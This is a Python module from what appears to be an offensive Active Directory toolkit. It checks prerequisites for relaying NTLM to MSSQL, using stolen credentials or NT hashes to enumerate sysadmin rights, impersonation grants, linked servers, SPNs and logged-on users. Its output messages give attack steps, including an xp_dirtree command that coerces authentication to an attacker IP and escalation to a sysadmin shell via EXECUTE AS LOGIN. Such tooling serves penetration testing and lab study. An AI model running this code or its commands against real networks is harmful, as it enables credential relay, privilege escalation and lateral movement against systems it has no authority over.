"""
MSSQL prerequisite checks for NTLM Relay → MSSQL.

Relaying NTLM to MSSQL allows executing xp_cmdshell or reading files
if the relayed account has sufficient SQL privileges.

Prerequisites:
  [REQ]  MSSQL service reachable (port 1433 or UDP 1434 discovery)
  [REQ]  SQL Server accepts Windows/NTLM authentication (not SQL-auth-only)
  [OPT]  Relayed user has direct sysadmin privilege
  [OPT]  Relayed user can impersonate a sysadmin account (EXECUTE AS LOGIN)
  [OPT]  Linked servers exist (lateral movement / privilege escalation path)
  [OPT]  MSSQL service account identified via SPN enumeration
  [OPT]  High-value users logged on to the MSSQL server

Note: SMB→MSSQL relay is often blocked by domain trust restrictions.
HTTP coercion (mitm6/WebDAV) is typically the reliable path to MSSQL relay.
Even without direct sysadmin, impersonation rights to a sysadmin account
are sufficient for full privilege escalation via EXECUTE AS LOGIN.
"""
from __future__ import annotations
import re
import socket
import subprocess

from .base import BaseCheck, CheckResult, Status
from ..config import TargetEnv

try:
    import ldap3
    from ldap3 import Server, Connection, NTLM, SUBTREE, ALL
    LDAP3_AVAILABLE = True
except ImportError:
    LDAP3_AVAILABLE = False


# ── helpers ────────────────────────────────────────────────────────────────

def _port_open(host: str, port: int, timeout: int = 5) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except OSError:
        return False


def _sql_browser_query(host: str, timeout: int = 5) -> list[str]:
    """Query SQL Browser (UDP 1434) for MSSQL instances."""
    instances = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(b"\x02", (host, 1434))
        data, _ = sock.recvfrom(4096)
        sock.close()
        if len(data) > 3:
            payload = data[3:].decode("ascii", errors="replace")
            for instance_str in payload.split(";;"):
                if "ServerName" in instance_str:
                    instances.append(instance_str.strip())
    except Exception:
        pass
    return instances


def _run_nxc_mssql(args: list[str], env: TargetEnv, timeout: int = 20) -> tuple[int, str, str]:
    try:
        cmd = ["nxc", "mssql"] + args
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError:
        try:
            cmd[0] = "crackmapexec"
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return r.returncode, r.stdout, r.stderr
        except FileNotFoundError:
            return -1, "", "nxc not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"


def _run_nxc_smb(args: list[str], env: TargetEnv, timeout: int = 20) -> tuple[int, str, str]:
    try:
        cmd = ["nxc", "smb"] + args
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError:
        try:
            cmd[0] = "crackmapexec"
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return r.returncode, r.stdout, r.stderr
        except FileNotFoundError:
            return -1, "", "nxc not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"


def _ldap_connect(env: TargetEnv):
    if not LDAP3_AVAILABLE:
        return None
    try:
        server = Server(env.dc_ip, get_info=ALL, connect_timeout=env.timeout)
        conn = Connection(
            server,
            user=env.cred.upn,
            password=env.cred.password,
            authentication=NTLM,
            auto_bind=True,
        )
        return conn
    except Exception:
        return None


def _nxc_base_args(host: str, env: TargetEnv) -> list[str]:
    """Base nxc mssql args for authenticated queries."""
    auth = (["-H", env.cred.nt_hash] if env.cred.nt_hash
            else ["-p", env.cred.password])
    return [host, "-u", env.cred.username, "-d", env.domain] + auth


# ── individual checks ──────────────────────────────────────────────────────

class MssqlPortCheck(BaseCheck):
    """
    MSSQL must be reachable. Check TCP 1433 and SQL Browser UDP 1434.
    """

    name = "MSSQL port reachable (TCP 1433 or discovered instance)"

    def _run(self) -> CheckResult:
        reachable = []
        instances_found = []

        for host in self.env.mssql_targets():
            if _port_open(host, 1433, timeout=self.env.timeout):
                reachable.append(host)
            instances = _sql_browser_query(host, timeout=self.env.timeout)
            if instances:
                instances_found.extend([f"{host}: {i[:80]}" for i in instances])

        if reachable:
            detail = f"MSSQL TCP 1433 open on: {', '.join(reachable)}."
            if instances_found:
                detail += f" SQL Browser instances: {'; '.join(instances_found[:3])}"
            return CheckResult(name=self.name, status=Status.PASS, detail=detail)

        if instances_found:
            return CheckResult(
                name=self.name, status=Status.WARN,
                detail=(
                    f"SQL Browser found instances but TCP 1433 not open: "
                    f"{'; '.join(instances_found[:3])}. Named instance on different port?"
                ),
            )

        return CheckResult(
            name=self.name, status=Status.FAIL,
            detail=(
                f"MSSQL not found on targets: {self.env.mssql_targets()}. "
                "TCP 1433 closed and SQL Browser returned nothing."
            ),
        )


class MssqlWindowsAuthCheck(BaseCheck):
    """
    SQL Server must accept Windows (NTLM) authentication.

    nxc output on success: "[+] domain\\user:pass" (with or without "(Pwn3d!)")
    nxc output on failure: STATUS_LOGON_FAILURE or "Login failed"
    """

    name = "MSSQL accepts Windows/NTLM authentication"

    def _run(self) -> CheckResult:
        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            rc, out, err = _run_nxc_mssql(_nxc_base_args(host, self.env), self.env)
            combined = (out + err).lower()

            if rc == -1:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")

            if "[+]" in out:
                return CheckResult(
                    name=self.name, status=Status.PASS,
                    detail=f"Windows/NTLM auth accepted on {host}.",
                )
            if "status_logon_failure" in combined or "login failed" in combined:
                return CheckResult(
                    name=self.name, status=Status.WARN,
                    detail=(
                        f"Windows auth enabled on {host} but credentials rejected. "
                        "Relay may still work — the relayed account needs SQL access, "
                        "not necessarily the enumeration account."
                    ),
                )
            if rc != -1:
                return CheckResult(
                    name=self.name, status=Status.WARN,
                    detail=(
                        f"MSSQL reachable on {host}, Windows auth attempted. "
                        f"Could not confirm result — try manually: "
                        f"`nxc mssql {host} -u <user> -p <pass> -d <domain>`"
                    ),
                    raw=out[:300],
                )

        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail="No MSSQL targets reachable on port 1433.",
        )


class MssqlPrivilegeCheck(BaseCheck):
    """
    Check if the enumeration account has direct sysadmin rights.

    nxc output format:
      is_sysadmin:1  → sysadmin
      is_sysadmin:0  → not sysadmin

    Note: even without direct sysadmin, relay is still valuable if the account
    can impersonate a sysadmin (see MssqlImpersonationCheck).
    """

    name = "SQL user has direct sysadmin privilege"
    required = False

    def _run(self) -> CheckResult:
        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            rc, out, err = _run_nxc_mssql(
                _nxc_base_args(host, self.env) +
                ["-q", "SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;"],
                self.env, timeout=20,
            )

            if rc == -1:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")

            combined = out + err
            # nxc output: "is_sysadmin:1" or "is_sysadmin:0"
            m = re.search(r"is_sysadmin:(\d)", combined)
            if m:
                if m.group(1) == "1":
                    return CheckResult(
                        name=self.name, status=Status.PASS,
                        detail=f"Account has direct sysadmin role on {host} — relay gives immediate xp_cmdshell.",
                    )
                else:
                    return CheckResult(
                        name=self.name, status=Status.FAIL,
                        detail=(
                            f"Account is NOT direct sysadmin on {host}. "
                            "Check impersonation paths below — may still reach sysadmin via EXECUTE AS."
                        ),
                    )

        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail="Could not check sysadmin privilege — auth may have failed.",
        )


class MssqlImpersonationCheck(BaseCheck):
    """
    Check if any domain accounts can impersonate a sysadmin via EXECUTE AS LOGIN.
    Even a non-sysadmin relay account can escalate if it has IMPERSONATE rights
    on a sysadmin login.

    nxc output format (one pair per row):
      who_can_impersonate:DOMAIN\\user
      who_gets_impersonated:DOMAIN\\sysadmin_user

    Performs a second query to confirm which impersonation targets are actually
    sysadmin — no hardcoded account names.
    """

    name = "SQL impersonation path to sysadmin exists"
    required = False

    IMPERSONATE_QUERY = (
        "SELECT b.name as who_can_impersonate, a.name as who_gets_impersonated "
        "FROM sys.server_permissions p "
        "JOIN sys.server_principals a ON p.major_id = a.principal_id "
        "JOIN sys.server_principals b ON p.grantee_principal_id = b.principal_id "
        "WHERE p.permission_name = 'IMPERSONATE';"
    )

    # Second query: look up actual sysadmin accounts from the server itself
    SYSADMIN_LIST_QUERY = (
        "SELECT name FROM sys.server_principals "
        "WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1 "
        "AND type_desc IN ('WINDOWS_LOGIN','WINDOWS_GROUP','SQL_LOGIN');"
    )

    def _run(self) -> CheckResult:
        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            # Step 1: get impersonation grants
            rc, out, err = _run_nxc_mssql(
                _nxc_base_args(host, self.env) + ["-q", self.IMPERSONATE_QUERY],
                self.env, timeout=20,
            )
            if rc == -1:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")

            combined = out + err
            can_impersonate = re.findall(r"who_can_impersonate:([^\r\n]+)", combined)
            gets_impersonated = re.findall(r"who_gets_impersonated:([^\r\n]+)", combined)

            if not can_impersonate:
                if "[+]" in out:
                    return CheckResult(
                        name=self.name, status=Status.FAIL,
                        detail=f"No IMPERSONATE grants found on {host}.",
                    )
                return CheckResult(
                    name=self.name, status=Status.SKIP,
                    detail="Could not query impersonation rights — auth may have failed.",
                )

            pairs = list(zip(
                [w.strip() for w in can_impersonate],
                [t.strip() for t in gets_impersonated],
            ))

            # Step 2: look up actual sysadmin accounts — no hardcoding
            sysadmin_accounts: set[str] = {"sa"}  # sa is always sysadmin
            rc2, out2, _ = _run_nxc_mssql(
                _nxc_base_args(host, self.env) + ["-q", self.SYSADMIN_LIST_QUERY],
                self.env, timeout=20,
            )
            if rc2 != -1 and "[+]" in out2:
                for m in re.finditer(r"[\s]name:([^\s\r\n()]+)", out2):
                    # store both full "DOMAIN\\user" and just "user" for flexible matching
                    full = m.group(1).strip().lower()
                    sysadmin_accounts.add(full)
                    sysadmin_accounts.add(full.split("\\")[-1])

            # Classify impersonation pairs
            sysadmin_paths = [
                (who, target) for who, target in pairs
                if target.lower() in sysadmin_accounts
                or target.lower().split("\\")[-1] in sysadmin_accounts
            ]
            other_paths = [(w, t) for w, t in pairs if (w, t) not in sysadmin_paths]

            if sysadmin_paths:
                sysadmin_strs = [f"{w} -> {t}" for w, t in sysadmin_paths]
                extra = (f" (other grants: {', '.join(f'{w} -> {t}' for w,t in other_paths)})"
                         if other_paths else "")
                return CheckResult(
                    name=self.name, status=Status.PASS,
                    detail=(
                        f"Impersonation path(s) to sysadmin on {host}: "
                        f"{'; '.join(sysadmin_strs)}.{extra} "
                        "Relay any left-hand account then EXECUTE AS LOGIN for sysadmin shell."
                    ),
                )

            pair_strs = [f"{w} -> {t}" for w, t in pairs]
            return CheckResult(
                name=self.name, status=Status.WARN,
                detail=(
                    f"Impersonation grants exist on {host}: {'; '.join(pair_strs)}. "
                    "None map to confirmed sysadmin accounts — verify manually."
                ),
            )


class MssqlLinkedServerCheck(BaseCheck):
    """
    Discover linked servers for lateral movement / privilege escalation.
    A linked server mapped to sa on a remote instance allows pivoting from
    a low-privilege local relay to full sysadmin on another SQL server.

    nxc output format:
      name:<LINKED_SERVER_NAME>
    """

    name = "MSSQL linked servers exist (lateral movement path)"
    required = False

    def _run(self) -> CheckResult:
        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            rc, out, err = _run_nxc_mssql(
                _nxc_base_args(host, self.env) +
                ["-q", "SELECT name FROM sys.servers WHERE is_linked = 1;"],
                self.env, timeout=20,
            )

            if rc == -1:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")

            combined = out + err

            # nxc output: "name:BRAAVOS" (one per linked server)
            # nxc query result lines end with "name:BRAAVOS" as the last field.
            # nxc header lines contain (name:CASTELBLACK) inside parentheses — skip those.
            linked_names = []
            for line in combined.splitlines():
                if any(m in line for m in ("[*]", "[-]", "Build", "SMBv1")):
                    continue
                m = re.search(r"[\s]name:([^\s\r\n()]+)\s*$", line)
                if m:
                    linked_names.append(m.group(1).strip())

            if linked_names and "[+]" in out:
                return CheckResult(
                    name=self.name, status=Status.PASS,
                    detail=(
                        f"Linked server(s) on {host}: {', '.join(linked_names)}. "
                        "May allow lateral movement — check linked server login mapping."
                    ),
                )

            if "[+]" in out:
                return CheckResult(
                    name=self.name, status=Status.FAIL,
                    detail=f"No linked servers found on {host}.",
                )

        return CheckResult(
            name=self.name, status=Status.FAIL,
            detail="No linked servers found or query failed.",
        )


class MssqlWebClientCheck(BaseCheck):
    """
    Optional: WebClient running on target enables HTTP/WebDAV coercion
    to force the MSSQL service account to authenticate for relay.

    For MSSQL relay, coercion methods include:
      - xp_dirtree (via SQL query — no WebClient needed)
      - mitm6 (DHCPv6/DNS poisoning — no WebClient needed)
      - PetitPotam HTTP (requires WebClient)
      - PrinterBug / PetitPotam RPC (no WebClient needed)
    """

    name = "WebClient running on target (HTTP coercion path)"
    required = False

    def _run(self) -> CheckResult:
        webclient_hosts = []
        for host in self.env.mssql_targets():
            if not _port_open(host, 445, timeout=self.env.timeout):
                continue
            try:
                r = subprocess.run(
                    ["nxc", "smb", host,
                     "-u", self.env.cred.username,
                     *((["-H", self.env.cred.nt_hash] if self.env.cred.nt_hash else ["-p", self.env.cred.password])),
                     "-d", self.env.domain,
                     "--module", "webdav"],
                    capture_output=True, text=True,
                    timeout=self.env.timeout + 10,
                )
                combined = (r.stdout + r.stderr).lower()
                if r.returncode != -1 and (
                    "webclient service enabled" in combined or
                    "webdav: true" in combined or
                    "running" in combined
                ):
                    webclient_hosts.append(host)
                else:
                    # Fallback: check via --services if --module webdav was ambiguous
                    r2 = subprocess.run(
                        ["nxc", "smb", host,
                         "-u", self.env.cred.username,
                         *(([ "-H", self.env.cred.nt_hash] if self.env.cred.nt_hash else ["-p", self.env.cred.password])),
                         "-d", self.env.domain,
                         "--services"],
                        capture_output=True, text=True,
                        timeout=self.env.timeout + 10,
                    )
                    combined2 = (r2.stdout + r2.stderr).lower()
                    if "webclient" in combined2 and ("running" in combined2 or "started" in combined2):
                        webclient_hosts.append(host)
            except Exception:
                pass

        if webclient_hosts:
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"WebClient running on: {', '.join(webclient_hosts)}. "
                    "HTTP coercion (PetitPotam HTTP) available. "
                    "xp_dirtree and PrinterBug coercion work regardless of WebClient."
                ),
            )
        return CheckResult(
            name=self.name, status=Status.WARN,
            detail=(
                "WebClient not confirmed — HTTP coercion path unavailable. "
                "Use xp_dirtree (requires SQL access), mitm6, PrinterBug, "
                "or PetitPotam RPC coercion instead."
            ),
        )


class MssqlXpDirtreeCoercionCheck(BaseCheck):
    """
    Optional: xp_dirtree can coerce MSSQL service account authentication
    without needing WebClient or PrinterBug. If the current account has
    SQL access (even low-priv), it can trigger outbound SMB auth from the
    SQL service account by executing:
        EXEC xp_dirtree '\\\\<attacker_ip>\\share'

    This is particularly useful because:
      - Works even when SMB signing is enforced (relay goes to LDAP/ADCS)
      - Doesn't require WebClient or Print Spooler
      - The SQL service account often has high domain privileges
      - Can be triggered with low-priv SQL access

    Check: verify SQL access exists (any auth = can trigger xp_dirtree).
    """

    name = "xp_dirtree coercion available (SQL access confirmed)"
    required = False

    def _run(self) -> CheckResult:
        for host in self.env.mssql_targets():
            if not _port_open(host, 1433, timeout=self.env.timeout):
                continue

            rc, out, err = _run_nxc_mssql(
                _nxc_base_args(host, self.env), self.env
            )
            if rc == -1:
                return CheckResult(name=self.name, status=Status.SKIP,
                                   detail="nxc not available.")

            if "[+]" in out:
                return CheckResult(
                    name=self.name, status=Status.PASS,
                    detail=(
                        f"SQL access confirmed on {host} — xp_dirtree coercion available. "
                        "Execute: `EXEC master.sys.xp_dirtree '\\\\<attacker-ip>\\demontlm',1,1` "
                        "to coerce the SQL service account into authenticating. "
                        "Relay that auth to LDAP/ADCS — no WebClient or PrinterBug needed."
                    ),
                )
            if "status_logon_failure" in (out + err).lower():
                return CheckResult(
                    name=self.name, status=Status.FAIL,
                    detail=(
                        f"SQL auth failed on {host} — xp_dirtree coercion not available "
                        "with this account. Gain any SQL access first."
                    ),
                )

        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail="No MSSQL targets reachable on port 1433.",
        )


class MssqlSpnCheck(BaseCheck):
    """
    Enumerate SPNs registered for MSSQLSvc to identify the service account
    running SQL Server. The service account determines relay impact:
      - Machine account (HOST$, NETWORK SERVICE) → limited domain rights
      - Dedicated svc account → depends on its group memberships
      - Privileged account (DA, etc.) → immediate domain compromise path

    Method: impacket-GetUserSPNs (listing only, no -request — passive recon)
            Fallback: ldap3 direct query for servicePrincipalName=MSSQLSvc/*

    Note: for cross-domain SPN enumeration (e.g. north trust → essos),
    run manually with -target-domain:
      impacket-GetUserSPNs <domain>/<user>:<pass> -target-domain <trusted-domain>
    """

    name = "MSSQL service account identified (SPN enumeration)"
    required = False

    SPN_PREFIX = "mssqlsvc"

    # Keywords that suggest the service account may have elevated privileges
    HIGH_VALUE_PATTERNS = [
        "admin", "da", "svc_sql", "sqlsvc", "sqlservice", "sql_svc",
        "mssql", "sql",
    ]

    def _run(self) -> CheckResult:
        getuserspns_available = True
        getuserspns_ran       = False

        # ── Method 1: impacket-GetUserSPNs ────────────────────────────────
        try:
            if self.env.cred.nt_hash:
                nh = self.env.cred.nt_hash.split(":")[-1]
                spns_auth = [
                    f"{self.env.domain}/{self.env.cred.username}",
                    "-hashes", f"aad3b435b51404eeaad3b435b51404ee:{nh}",
                ]
            else:
                spns_auth = [
                    f"{self.env.domain}/{self.env.cred.username}:{self.env.cred.password}",
                ]
            cmd = [
                "impacket-GetUserSPNs",
                *spns_auth,
                "-dc-ip", self.env.dc_ip,
            ]
            r = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=self.env.timeout + 15,
            )
            combined = r.stdout + r.stderr
            getuserspns_ran = True

            if r.returncode != -1 and self.SPN_PREFIX in combined.lower():
                spns = self._parse_getuserspns_output(combined)
                if spns:
                    return self._format_result(spns)

            # Tool ran but no MSSQLSvc SPNs in output — domain genuinely has none
            # (or the account lacks permission to read them)
            if getuserspns_ran and r.returncode != -1:
                combined_lower = combined.lower()
                if "no entries found" in combined_lower or "principal" not in combined_lower:
                    return CheckResult(
                        name=self.name, status=Status.SKIP,
                        detail=(
                            f"No MSSQLSvc SPNs found in {self.env.domain} — "
                            "MSSQL service account not registered via SPN in this domain. "
                            "If MSSQL runs in a trusted domain, run manually with -target-domain: "
                            f"`impacket-GetUserSPNs {self.env.domain}/<user>:<pass> "
                            f"-dc-ip {self.env.dc_ip} -target-domain <trusted-domain>`"
                        ),
                    )

        except FileNotFoundError:
            getuserspns_available = False  # fall through to ldap3
        except subprocess.TimeoutExpired:
            getuserspns_available = False

        # ── Method 2: ldap3 direct SPN query ──────────────────────────────
        if LDAP3_AVAILABLE:
            conn = _ldap_connect(self.env)
            if conn:
                try:
                    domain_dn = ",".join(f"DC={p}" for p in self.env.domain.split("."))
                    conn.search(
                        search_base=domain_dn,
                        search_filter=f"(servicePrincipalName={self.SPN_PREFIX}/*)",
                        search_scope=SUBTREE,
                        attributes=["sAMAccountName", "servicePrincipalName"],
                    )
                    spns = []
                    for entry in conn.entries:
                        account = str(entry["sAMAccountName"])
                        for spn in entry["servicePrincipalName"]:
                            if self.SPN_PREFIX in str(spn).lower():
                                spns.append((str(spn), account))
                    conn.unbind()
                    if spns:
                        return self._format_result(spns)

                    # ldap3 connected and queried but found nothing
                    return CheckResult(
                        name=self.name, status=Status.SKIP,
                        detail=(
                            f"No MSSQLSvc SPNs registered in {self.env.domain}. "
                            "MSSQL may be running without a registered SPN, or the service "
                            "account is in a trusted domain. "
                            "Check cross-domain with: "
                            f"`impacket-GetUserSPNs {self.env.domain}/<user>:<pass> "
                            f"-dc-ip {self.env.dc_ip} -target-domain <trusted-domain>`"
                        ),
                    )
                except Exception as e:
                    return CheckResult(
                        name=self.name, status=Status.SKIP,
                        detail=f"LDAP SPN query failed: {e}",
                    )
                finally:
                    try:
                        conn.unbind()
                    except Exception:
                        pass

        # Both methods unavailable
        return CheckResult(
            name=self.name, status=Status.SKIP,
            detail=(
                "Could not check MSSQL SPNs — impacket-GetUserSPNs not found and ldap3 unavailable. "
                "Run manually: "
                "`impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc>`"
            ),
        )

    def _parse_getuserspns_output(self, output: str) -> list[tuple[str, str]]:
        """
        Parse impacket-GetUserSPNs table output.

        Table format (no -request):
          ServicePrincipalName                   Name          ...
          -------------------------------------  ------------  ...
          MSSQLSvc/braavos.essos.local:1433      svc.sql       ...
        """
        spns: list[tuple[str, str]] = []
        in_table = False

        for line in output.splitlines():
            stripped = line.strip()
            # Detect table start — separator line of dashes
            if re.match(r"^[-\s]+$", stripped) and len(stripped) > 10:
                in_table = True
                continue
            if not in_table:
                continue
            if not stripped:
                in_table = False
                continue
            # Table row: columns are space-separated; SPN is first, Name is second
            parts = stripped.split()
            if len(parts) >= 2 and self.SPN_PREFIX in parts[0].lower():
                spns.append((parts[0], parts[1]))

        return spns

    def _format_result(self, spns: list[tuple[str, str]]) -> CheckResult:
        """Format SPN results with service account risk assessment."""
        accounts = list(dict.fromkeys(account for _, account in spns))

        spn_list = ", ".join(spn for spn, _ in spns[:4])
        if len(spns) > 4:
            spn_list += f" (+{len(spns) - 4} more)"

        # Risk-assess the accounts
        machine_accounts = [a for a in accounts if a.endswith("$")]
        high_value = [
            a for a in accounts
            if not a.endswith("$")
            and any(p in a.lower() for p in self.HIGH_VALUE_PATTERNS)
        ]
        svc_accounts = [
            a for a in accounts
            if a not in machine_accounts and a not in high_value
        ]

        parts = [f"MSSQLSvc SPN(s): {spn_list}."]

        if high_value:
            parts.append(
                f"Service account(s): {', '.join(high_value)}. "
                "Verify group memberships — may have elevated domain privileges. "
                "Use: `net user <account> /domain` or BloodHound."
            )
        elif machine_accounts:
            parts.append(
                f"Service runs as machine account: {', '.join(machine_accounts)} — "
                "limited domain privileges expected."
            )
        elif svc_accounts:
            parts.append(
                f"Service account(s): {', '.join(svc_accounts)}. "
                "Check group memberships to assess relay impact."
            )

        return CheckResult(
            name=self.name,
            status=Status.PASS,
            detail=" ".join(parts),
            raw=f"All SPN entries: {spns}",
        )


class MssqlLoggedOnUsersCheck(BaseCheck):
    """
    Check for high-value accounts currently logged on to the MSSQL server
    via SMB session enumeration. Helps prioritise which hosts to coerce.

    Requires local admin on the target — enumerating logged-on users calls
    NetWkstaUserEnum via DCERPC, which is restricted to local admins.
    Non-admin accounts get rpc_s_access_denied (0x5).

    nxc output format (one user per line, after the auth line):
      SMB  <host>  445  HOSTNAME  NORTH\\robb.stark    logon_server: WINTERFELL
      SMB  <host>  445  HOSTNAME  NORTH\\MACHINE$      logon_server:

    Machine accounts (ending in $) are filtered — they are not useful relay targets.

    Method: nxc smb <host> --loggedon-users
    (SMB protocol exposes session info via NetWkstaUserEnum)
    """

    name = "High-value users logged on to MSSQL server (requires local admin)"
    required = False

    HIGH_VALUE_KEYWORDS = [
        "admin", "administrator", "da", "svc", "service",
        "backup", "exchange", "sql",
    ]

    def _run(self) -> CheckResult:
        # Only query hosts with port 1433 open — mssql_targets() may include
        # the DC (used for LDAP checks) which we don't want here.
        mssql_hosts = [
            host for host in self.env.mssql_targets()
            if _port_open(host, 1433, timeout=self.env.timeout)
            and _port_open(host, 445, timeout=self.env.timeout)
        ]

        if not mssql_hosts:
            return CheckResult(
                name=self.name, status=Status.SKIP,
                detail="No MSSQL targets reachable on both TCP 1433 and SMB 445.",
            )

        results: list[tuple[str, list[str]]] = []
        access_denied_hosts: list[str] = []

        for host in mssql_hosts:
            rc, out, err = _run_nxc_smb(
                [host,
                 "-u", self.env.cred.username,
                 *((["-H", self.env.cred.nt_hash] if self.env.cred.nt_hash else ["-p", self.env.cred.password])),
                 "-d", self.env.domain,
                 "--loggedon-users"],
                self.env,
                timeout=self.env.timeout + 10,
            )

            if rc == -1:
                return CheckResult(
                    name=self.name, status=Status.SKIP,
                    detail="nxc not available.",
                )

            combined = out + err

            if "rpc_s_access_denied" in combined.lower() or "access_denied" in combined.lower():
                access_denied_hosts.append(host)
                continue

            if "[+]" not in out:
                continue

            # Parse user lines. nxc format after the auth [+] line:
            #   SMB  192.168.x.x  445  HOSTNAME  NORTH\robb.stark    logon_server: WINTERFELL
            # Lines with [*]/[+]/[-] are metadata — skip them.
            # The username is the 5th whitespace token (index 4): DOMAIN\user
            users: list[str] = []
            for line in out.splitlines():
                if re.search(r"\[[\*\+\-]\]", line):
                    continue
                parts = line.split()
                if len(parts) < 5:
                    continue
                candidate = parts[4]
                if "\\" not in candidate:
                    continue
                if candidate.endswith("$"):
                    # Machine account — not a useful session to highlight
                    continue
                users.append(candidate)

            if users:
                results.append((host, list(dict.fromkeys(users))))

        # Build response
        if not results and access_denied_hosts:
            return CheckResult(
                name=self.name, status=Status.SKIP,
                detail=(
                    f"Access denied on {', '.join(access_denied_hosts)} — "
                    "enumerating logged-on users requires local admin (NetWkstaUserEnum). "
                    "Run manually with an admin account: "
                    "`nxc smb <host> -u <admin> -p <pass> --loggedon-users`"
                ),
            )

        if not results:
            return CheckResult(
                name=self.name, status=Status.WARN,
                detail="No logged-on users detected — no active user sessions at this time.",
            )

        # Summarise and flag high-value accounts
        all_users: list[str] = []
        host_summaries: list[str] = []
        for host, users in results:
            all_users.extend(users)
            summary = f"{host}: {', '.join(users[:4])}"
            if len(users) > 4:
                summary += f" (+{len(users) - 4} more)"
            host_summaries.append(summary)

        high_value = list(dict.fromkeys(
            u for u in all_users
            if any(kw in u.lower() for kw in self.HIGH_VALUE_KEYWORDS)
        ))

        if high_value:
            hv_str = ", ".join(high_value[:5])
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"High-value account(s) active: {hv_str}. "
                    f"Full sessions — {'; '.join(host_summaries)}. "
                    "Prioritise this host for coercion."
                ),
                raw=str(results),
            )

        return CheckResult(
            name=self.name, status=Status.WARN,
            detail=(
                f"Logged-on users found: {'; '.join(host_summaries)}. "
                "No immediately high-value accounts identified — "
                "review manually to assess coercion priority."
            ),
            raw=str(results),
        )


# ── attack check list ──────────────────────────────────────────────────────

def get_checks(env: TargetEnv) -> list[BaseCheck]:
    return [
        MssqlPortCheck(env),
        MssqlWindowsAuthCheck(env),
        MssqlPrivilegeCheck(env),
        MssqlImpersonationCheck(env),
        MssqlLinkedServerCheck(env),
        MssqlWebClientCheck(env),
        MssqlXpDirtreeCoercionCheck(env),
        MssqlSpnCheck(env),
        MssqlLoggedOnUsersCheck(env),
    ]

ATTACK_NAME = "NTLM Relay → MSSQL"
